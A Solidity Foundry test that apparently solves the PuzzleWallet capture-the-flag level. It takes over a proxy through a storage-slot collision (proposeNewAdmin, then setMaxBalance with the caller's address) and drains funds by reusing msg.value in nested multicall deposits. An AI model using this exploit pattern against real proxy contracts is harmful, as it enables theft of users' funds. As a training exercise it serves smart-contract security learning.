// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
 
import {Test} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";
import "forge-std/console.sol";

contract SafeTest is Test {

	PuzzleProxy public proxy = new PuzzleProxy();
	PuzzleWallet public instance = PuzzleWallet(address(proxy));

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function setUp() public {
        


    }
 
    function testSolution() public {




        console.log("=== LOGs ===");
        console.log(proxy.pendingAdmin());
        console.log(proxy.admin());
        console.log(instance.owner());
        console.logBytes32(bytes32(instance.maxBalance()));
        console.logBytes32(bytes32(address(instance).balance));


        proxy.proposeNewAdmin(me);

        console.log("=== LOGs ===");
        console.log(proxy.pendingAdmin());
        console.log(proxy.admin());
        console.log(instance.owner());

        assertEq(me, proxy.pendingAdmin());
        assertEq(me, instance.owner());

        instance.addToWhitelist(me);

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](4);
        data[0] = depositData[0];
        data[1] = abi.encodeWithSelector(instance.multicall.selector, depositData);
        data[2] = abi.encodeWithSelector(instance.multicall.selector, depositData);
        data[3] = abi.encodeWithSelector(instance.multicall.selector, depositData);
        // data[2] = abi.encodeWithSignature("deposit()");
        

        instance.multicall{value: 0.001 ether}(data);
        instance.execute(me, 0.002 ether, "");
        instance.setMaxBalance(uint256(uint160(me)));

        console.log("=== LOGs ===");
        console.log(proxy.pendingAdmin());
        console.log(proxy.admin());
        console.log(instance.owner());
        console.logBytes32(bytes32(instance.maxBalance()));
        console.logBytes32(bytes32(address(instance).balance));

        assertEq(me, instance.owner());



    }
}